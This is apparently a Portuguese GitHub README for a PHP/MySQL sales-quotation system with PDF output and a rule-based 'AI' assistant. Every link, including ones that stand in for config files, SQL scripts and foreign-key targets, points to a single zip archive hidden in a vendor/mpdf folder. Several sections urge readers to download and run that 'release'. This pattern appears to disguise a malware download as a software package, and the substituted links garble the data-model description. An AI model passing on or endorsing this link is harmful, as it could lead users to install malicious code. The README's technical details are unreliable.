https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip

[![Releases](https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)](https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)

# Sistema de Cotações Web em PHP com IA e PDFs Dinâmicos 🧾🤖

Uma aplicação web construída em PHP puro, com MySQL, que facilita a criação e a gestão de orçamentos comerciais. O sistema integra recursos de CRUD para clientes, produtos e usuários, além de um módulo avançado para gerar cotações em PDF de forma dinâmica. Esta solução foca em simplicidade de uso, desempenho estável e uma base pronta para personalizações conforme o negócio evolui.

O objetivo é oferecer um ambiente completo para equipes comerciais e freelancers que precisam de uma ferramenta confiável para emitir propostas profissionais. A IA integrada ajuda a sugerir condições, preços e textos de cotação, apoiando decisões rápidas sem depender de ferramentas externas. O PDF gerado pode ser enviado por SMTP, armazenado ou impresso, mantendo um padrão de documento claro e profissional.

Imagens que ajudam a entender o tema:
- PHP na prática com código limpo e direto ao ponto.
- MySQL como motor de armazenamento de dados.
- Geração de PDFs para documentos oficiais de venda.

Se você procura uma solução pronta para gerenciar cotações, com foco em PHP, MySQL e geração de PDFs, este repositório oferece uma base sólida para começar. Explore como a combinação de CRUD, automação de documentos e inteligência artificial pode transformar seu fluxo de trabalho comercial.

Índice
- Visão geral do projeto
- Funcionalidades principais
- Arquitetura e estrutura de pastas
- Tecnologias e padrões
- Preparação do ambiente
- Instalação passo a passo
- Modelos de dados
- Fluxo de uso diário
- Geração de cotações em PDF
- Inteligência artificial aplicada
- Segurança e boas práticas
- Personalização e extensões
- Testes e qualidade
- Implantação e streaming de entregas
- Contribuição
- Licença
- Perguntas frequentes
- Contato

Visão geral do projeto
Este projeto representa uma aplicação web de gestão de orçamentos, executada inteiramente em PHP puro com persistência em MySQL. O foco está no uso diário pelo time comercial, que precisa de fluxos simples para cadastrar clientes, gerenciar produtos e usuários, além de compor cotações com itens de linha e condições comerciais. O diferencial é o módulo de geração dinâmica de PDFs, com o layout preparado para parecer profissional desde o primeiro uso.

Além disso, o sistema incorpora uma camada de IA que suporta decisões rápidas em cada cotação. Por meio de regras locais e modelos simples, a IA oferece sugestões de preços, descontos condicionais, textos de apresentação da cotação e recomendações de itens complementares. A ideia é acelerar o ciclo de venda sem depender de serviços externos.

Funcionalidades principais
- Criação, leitura, atualização e exclusão (CRUD) de clientes.
- CRUD de produtos com atributos essenciais: código, descrição, preço, estoque.
- CRUD de usuários com controle de acesso e papéis (admin, vendedor, suporte).
- Gerenciamento de cotações: criação, edição, aprovação e histórico.
- Itens de cotação: adição de produtos com quantidade, preço unitário e subtotal.
- Geração dinâmica de PDFs de cotações com formatação profissional.
- Envio de cotações por e-mail via SMTP integrado.
- IA local para sugestões de preço, descontos e textos de cotação.
- Autenticação de usuários com sessões seguras.
- Rotas e telas responsivas com estilo moderno (Bootstrap).
- Compatibilidade com XAMPP para desenvolvimento local.
- Arquitetura modular que facilita a extensão de recursos.

Arquitetura e estrutura de pastas
- public/ – arquivos acessíveis pelo navegador (https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip, recursos públicos, assets).
- src/ – código-fonte da aplicação.
  - controllers/ – controladores que coordenam fluxos de negócios.
  - models/ – entidades e lógica de dados (Clientes, Produtos, Usuarios, Cotacoes, ItensCotacao).
  - views/ – templates de interface (HTML + CSS do Bootstrap).
  - services/ – serviços reutilizáveis (PDF generator, SMTP sender, IA module).
  - config/ – configuração da aplicação (conexão com o MySQL, parâmetros de IA).
- vendor/ – dependências (caso use Composer para algum componente, como MPDF).
- database/ – scripts de criação de banco de dados, seeders e migrations.
- tests/ – casos de teste básicos ou manuais para validação.
- docs/ – documentação adicional, guias e notas de design.

Tecnologias e padrões
- PHP puro (sem determinados requisitos de framework). A escolha simples facilita a manutenção e o deploy.
- MySQL como sistema de gerenciamento de banco de dados.
- Bootstrap para interface rápida e responsiva.
- MPDF e/ou FPDF para geração de PDFs dinâmicos de cotações.
- SMTP para envio de e-mails com cotações anexadas.
- Padrões de design como MVC leve (Model-View-Controller) para separar responsabilidades.
- Autenticação baseada em senhas com hash seguro (password_hash) e sessões gerenciadas.
- Injeção de dependências simples para facilitar testes e manutenção.
- IA interna que funciona com regras locais e apoio de modelos simples, sem depender de serviços externos por padrão.
- Importação de dados com validação — evitando inconsistências.
- Controle de acessos por papéis para proteger rotas sensíveis.

Preparação do ambiente
Antes de começar, tenha em mente que a instalação depende de um servidor PHP com MySQL rodando. Os requisitos mínimos ajudam a evitar problemas comuns durante a configuração.

- PHP 7.4 ou superior (recomendado PHP 8.x para melhor desempenho).
- MySQL 5.7 ou superior.
- Servidor web: Apache ou Nginx (com configuração básica de rewrites para friendly URLs).
- Extensões PHP necessárias: PDO MySQL, mbstring, openssl (para sessões seguras), json, GD (para imagens se necessário).
- Acesso de rede local para facilitar o desenvolvimento (endereçamento 127.0.0.1 ou localhost).
- Opcional: XAMPP ou WAMP para um ambiente de desenvolvimento simplificado.
- Dependências de PDF: fontes padrão, que MPDF/FPDF costumam carregar automaticamente.

Instalação passo a passo
Este guia descreve um caminho prático para colocar o sistema em operação. Siga cada etapa com cuidado para evitar falhas simples de configuração.

1) Obter o código
- Clone este repositório ou baixe o pacote de código disponível na página de releases.
- Se preferir, use a interface de usuário do GitHub para baixar o ZIP do repositório.

2) Preparar o servidor
- Coloque o código na raiz de um servidor web. Em ambientes locais, a pasta htdocs do XAMPP ou a raiz do servidor se estiver usando Apache/Nginx já bastam.
- Garanta que as permissões das pastas permitam leitura pelo servidor e escrita, quando necessário (padrões recomendam permissões restritas para segurança, com exceções para pastas de upload, se houver).

3) Configurar a conexão com o banco de dados
- Copie o arquivo de configuração de exemplo para uma versão local, por exemplo https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip para https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip
- Edite as credenciais com o host, usuário, senha e nome do banco que você criou para o projeto.
- Crie o banco de dados e aplique o script de inicialização disponível na pasta database/ (por exemplo: https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip ou migrations/).
- Verifique a conectividade acessando a aplicação e tentando uma operação básica de leitura de dados.

4) Preparar o banco de dados
- Execute o script SQL de criação de tabelas para clientes, produtos, usuários, cotações e itens de cotação.
- Considere inserir alguns dados de exemplo para acelerar o primeiro uso.
- Verifique índices para consultas frequentes (como índice em https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip, https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip, https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip) para desempenho melhor.

5) Ajustes de ambiente
- Verifique as permissões de diretórios para logs, exportações de PDF e uploads, caso a aplicação utilize esses recursos.
- Se usar MPDF ou FPDF, confirme que as fontes estão disponíveis no servidor ou que o gerador está apontando para o local correto das fontes.

6) Iniciar a aplicação
- Acesse a URL correspondente ao seu ambiente. Em ambientes locais, algo como http://localhost/sistema-de-cotacoes/public.
- Crie um usuário administrador pela primeira vez ou utilize o usuário fornecido pelos dados de demonstração, se disponível.
- Confirme que as telas de CRUD, geração de PDF e envio por SMTP funcionam conforme esperado.

Modelos de dados
A estrutura de dados é o coração do sistema. Abaixo está um modelo conceitual com as tabelas centrais, seus campos e relacionamentos.

- Clientes
  - id (PK)
  - nome
  - email
  - telefone
  - endereco
  - cidade
  - estado
  - pais
  - criado_em
  - atualizado_em

- Produtos
  - id (PK)
  - codigo
  - descricao
  - preco_unitario
  - estoque
  - unidade_medida
  - criado_em
  - atualizado_em

- Usuarios
  - id (PK)
  - usuario
  - senha_hash
  - nome_exibicao
  - email
  - papel (admin, vendedor, suporte)
  - ativo
  - criado_em
  - atualizado_em

- Cotacoes
  - id (PK)
  - cliente_id (FK -> https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)
  - usuario_id (FK -> https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)  // quem criou a cotação
  - numero_cotacao
  - data_emissao
  - data_validade
  - subtotal
  - imposto
  - total
  - status (rascunho, enviado, aceito, cancelado)
  - observacoes
  - criado_em
  - atualizado_em

- ItensCotacao
  - id (PK)
  - cotacao_id (FK -> https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)
  - produto_id (FK -> https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)
  - descricao (texto opcional caso o produto não exista)
  - quantidade
  - preco_unitario
  - total
  - criado_em
  - atualizado_em

- Logs e auditoria (opcional)
  - id
  - user_id
  - acao
  - data_hora
  - detalhes

Note que o modelo acima é uma base sólida para começar. Você pode adaptar nomes de campos, tipos e relacionamentos conforme o domínio do seu negócio e a evolução da aplicação. É comum acrescentar tabelas para descontos por cliente, impostos específicos, fluxos de aprovação ou histórico de alterações em cotação.

Fluxo de uso diário
- Cadastro de clientes: ao receber um lead, o vendedor registra rapidamente as informações básicas do cliente, incluindo contatos, endereço e preferências. O fluxo é simples e direto, com campos mínimos para iniciar uma cotação.
- Gerenciamento de produtos: mantenha um catálogo de itens com códigos, descrições, preços e disponibilidade. Em muitos casos, o vendedor busca itens frequentes para compor a cotação.
- Criação de cotação: com o cliente definido, o usuário cria uma nova cotação, adiciona itens da lista de produtos e ajusta quantidades. A aplicação calcula automaticamente o subtotal, imposto e total.
- Geração de PDF: a cotação recebe um PDF formatado com cabeçalho, dados do cliente, itens, termos e condições. O documento fica pronto para envio.
- Envio por SMTP: o PDF pode ser enviado por e-mail diretamente pela interface, com opções de personalização de assunto e corpo do e-mail.
- Histórico e auditoria: cada cotação mantém um registro de alterações, quem criou e quem modificou, ajudando na rastreabilidade.
- IA para suporte de preço: ao compor a cotação, a IA sugere preços, descontos condicionais e textos de apresentação, baseados no contexto do cliente e no histórico de ofertas.
- Acompanhamento: o sistema oferece filtros para localizar cotações por cliente, estado, data e valores. Isso facilita a gestão de pipeline.

Geração de cotações em PDF
O módulo de PDF usa uma biblioteca de geração de documentos para criar cotações com aparência profissional. Principais características:
- Layout personalizável: cabeçalho com logotipo, informações da empresa, dados do cliente, data de emissão e validade.
- Tabela de itens: cada linha mostra produto, descrição, quantidade, preço unitário e total. Totais aparecem com formatos de moeda apropriados.
- Rasões legais e termos: inclusão de termos de venda, garantias e condições de pagamento quando necessário.
- Assinaturas digitais: suporte para inserir assinatura ou carimbos, conforme a política do negócio.
- Otimização para impressão: o PDF é otimizado para impressão em papel A4 com margens e fontes legíveis.
- Geração rápida: o fluxo de criação de cotação dispara o gerador de PDF assim que os itens são salvos, reduzindo tempo entre venda e proposta.
- Envio por e-mail com anexos: o PDF pode ser enviado diretamente para o cliente, com o corpo da mensagem personalizável.

Integração de Inteligência Artificial
A IA local funciona como assistente de cotações, sem depender de serviços externos. Ela oferece:
- Sugestões de preços: com base no histórico de clientes, tendências de itens e margens desejadas, a IA sugere preços de venda, descontos por volume e condições comerciais.
- Textos de apresentação: proposta de textos curtos para a introdução da cotação e para notas sobre condições de venda.
- Recomendação de itens adicionais: sugestões de itens complementares que podem aumentar o valor da cotação.
- Análise de risco: sinalização de itens com margens muito baixas ou descontos acima de limites aceitáveis.
- Personalização por cliente: sugestões ajustadas ao perfil do cliente, seu segmento e histórico de compras.
- Modos de operação: regras simples embutidas no código para manter a IA estável sem depender de APIs externas; há também um caminho para integração com modelos externos caso a necessidade evolua.

Essa abordagem oferece ganhos reais no tempo de resposta, sem exigir infraestruturas complexas. A IA funciona com regras claras, que você pode inspecionar, ajustar e estender conforme o seu negócio cresce.

Segurança e boas práticas
Segurança é um pilar essencial, especialmente quando se lida com dados de clientes e informações comerciais sensíveis. Algumas medidas básicas já estão presentes, e você poderá evoluir com base nas necessidades específicas.

- Autenticação forte: senhas armazenadas com hash seguro (password_hash) e verificação com password_verify.
- Gerência de sessões: sessões com tempo de expiração e regeneração de IDs para evitar sequestro.
- Validação de entrada: validação de dados de clientes, produtos e cotações para evitar injeção de SQL e falhas de integridade.
- Consultas preparadas: uso de prepared statements para evitar ataques de SQL Injection.
- Controle de acesso: divisão por papéis (admin, vendedor, suporte) para proteger operações sensíveis (ex.: exclusão de clientes).
- Armazenamento de arquivos: se houver exportações ou uploads, isolar esse conteúdo e aplicar verificações de tipo de arquivo.
- Logs de auditoria: registro de ações de usuários para auditoria e rastreabilidade.
- Proteção básica contra CSRF: tokens para formulários sensíveis (login, alteração de dados, envio de cotação).
- Configurações de ambiente: manter informações sensíveis fora do código fonte sempre que possível; usar arquivos de configuração com permissões restritas.

Personalização e extensões
A arquitetura foi pensada para evoluir. Algumas direções comuns para personalização:
- Temas de interface: substituição de CSS/Bootstrap para atender a identidade visual da empresa.
- Modelos de PDF: ajuste de layout, cabeçalhos, rodapés, fontes e estilos de tabela para cada cliente.
- Regras de IA: adição de regras conectadas a seu negócio (por exemplo, margens mínimas por produto, descontos por faixa de faturamento).
- Novos relatórios: geração de relatórios de vendas, lucratividade por cliente ou por produto.
- Integração com serviços externos: envio de cotações por API, integração com CRMs, webhooks para gatilhos de vendas.
- Exportação de dados: exportação de dados de clientes, produtos ou cotações para CSV/Excel.

Práticas de desenvolvimento
- Organização do código: mantenha os módulos coesos. Separe lógica de negócios, apresentação e acesso a dados.
- Testes manuais: valide cenários comuns (criação de cotação com vários itens, geração de PDF, envio por SMTP).
- Backup de dados: implemente rotinas simples de backup do banco de dados antes de operações significativas.
- Controle de versão: use Git de forma disciplinada. Registre mudanças relevantes em mensagens de commit curtas e descritivas.
- Atualizações de dependências: se houver dependências PHP, mantenha-as atualizadas para receber correções de segurança.

Testes e qualidade
- Testes manuais de fluxo: cadastre clientes, crie cotação, adicione itens, gere o PDF, envie por SMTP.
- Verificações de consistência: previsões de IA devem permanecer dentro de margens razoáveis, especialmente para descontos e totais.
- Testes de compatibilidade: verifique a renderização do PDF em diferentes visualizações (A4, retrato vs. paisagem, se aplicável).
- Cobertura de erros: trate cenários de dados ausentes (por exemplo, cotação sem itens) com mensagens úteis para o usuário.
- Log de erros: mantenha um log simples para diagnosticar problemas de geração de PDF, envio de e-mails ou acesso a dados.

Deploy e entrega
- Desenvolvimento local: use XAMPP, WAMP ou um servidor PHP com MySQL para testes.
- Ambiente de staging: opte por um servidor com PHP 8.x, MySQL atualizado e TLS para comunicações seguras.
- Produção: garanta backup, monitoração de desempenho e políticas de segurança adicionais (ACLs, firewall, TLS estrito).
- Escalabilidade: a base pode suportar várias cotações por dia; se a demanda crescer, avalie a otimização de consultas e a configuração do servidor de PDF.

Contribuição
A comunidade pode ajudar a tornar o sistema mais sólido. Se você deseja contribuir:
- Abra issues para relatar bugs, sugerir melhorias ou discutir novas ideias.
- Envie pull requests com mudanças bem documentadas. Inclua testes ou passos reproduzíveis sempre que possível.
- Siga o estilo de código existente, mantenha a consistência de nomenclatura e comente trechos complexos para facilitar a revisão.
- Documente as dependências, configurações e passos de uso que forem alterados.

Licença
Este projeto utiliza uma licença de código aberto. As condições da licença permitem uso, modificação e distribuição. Leia o arquivo de licença no repositório para entender as permissões e as obrigações.

Perguntas frequentes
- Preciso de conhecimento avançado para rodar a aplicação?
  A configuração básica envolve conhecimentos de PHP e MySQL. Com as instruções acima, você pode colocar a aplicação para rodar em um ambiente local e, a partir daí, avançar na personalização.
- A IA depende de serviços externos?
  A implementação atual utiliza IA local com regras e lógicas simples. É possível estender para integrações com APIs de IA externas conforme a necessidade.
- Como envio as cotações por e-mail?
  A aplicação suporta SMTP. Configure as credenciais do servidor de e-mail e use a funcionalidade de envio de cotação em PDF diretamente da tela de cotação.
- Posso adaptar o PDF de acordo com a minha marca?
  Sim. O layout é modular. Você pode alterar cabeçalho, fontes, cores e estilos de tabela para refletir a identidade da sua empresa.

Conteúdos adicionais (recursos, guias e referências)
- Referências visuais:
  - PHP: recursos oficiais e logos para incluir em documentação interna.
  - MySQL: logos e ícones oficiais para documentação visual.
  - Bibliotecas de PDF (MPDF/FPDF): guias de uso, exemplos de código e templates de documentos.
- Exemplos de fluxos de dados: exemplos de como dados de clientes, itens e cotações passam pelo sistema e geram PDFs.
- Padrões de projeto aplicados: princípios de separação de responsabilidades, validação de dados e proteção de acessos.

Notas sobre o link de releases
Para obter a versão mais recente do código, acesse o link de releases. A página oferece pacotes de distribuição com o código-fonte e, possivelmente, binários do sistema. Você pode baixar o pacote da release mais recente para instalar rapidamente. O link é útil para obter a base estável de distribuição, incluindo qualquer correção de bugs ou melhorias implementadas pela comunidade.

Releases
- A página de releases contém pacotes que você pode baixar e executar. A versão mais recente costuma incluir atualizações de código, ajustes de desempenho e correções de segurança.
- Em muitos casos, os pacotes incluem scripts de configuração, scripts de banco de dados e exemplos de uso que ajudam a acelerar a instalação. Verifique os arquivos disponíveis na release para entender exatamente o que está incluído.
- Se preferir, navegue pelas releases anteriores para entender a evolução do projeto e identificar mudanças que possam impactar a sua implantação.

Recursos adicionais para desenvolvedores
- Boas práticas com PHP puro: dicas para manter código legível, estável e fácil de manter.
- Arquitetura modular: como dividir a aplicação em componentes facilmente substituíveis.
- Integração com bibliotecas de PDF: critérios para escolher MPDF ou FPDF, bem como técnicas para otimizar a geração de documentos.
- Segurança na prática: checklists simples para proteger dados, autenticação e autorização.

Notas finais sobre o conteúdo
Este README é uma visão abrangente para quem quer entender, orçar e adaptar a solução de cotações baseada em PHP, MySQL e PDF dinâmico. Ele descreve o propósito, as capacidades e as áreas de melhoria que você pode explorar à medida que o projeto cresce. Use as seções como guia para iniciar rapidamente, configurar seu ambiente e personalizar o sistema para atender às suas necessidades específicas.

Observação sobre o primeiro link
Para baixar a versão mais recente, use o link de releases disponibilizado no topo. Ele direciona para a página de releases do repositório, onde você encontra o pacote pronto para instalação. Acesse o link novamente para confirmar a disponibilidade de novos lançamentos. Consulte a seção releases para encontrar o arquivo adequado para o seu ambiente e seguir as instruções de instalação correspondentes.

Aproveite a base para construir, adaptar e aprimorar suas cotações com eficiência, qualidade e confiabilidade. Cada parte do sistema foi projetada com foco em praticidade, clareza e continuidade — para que você possa entregar propostas profissionais com rapidez e consistência.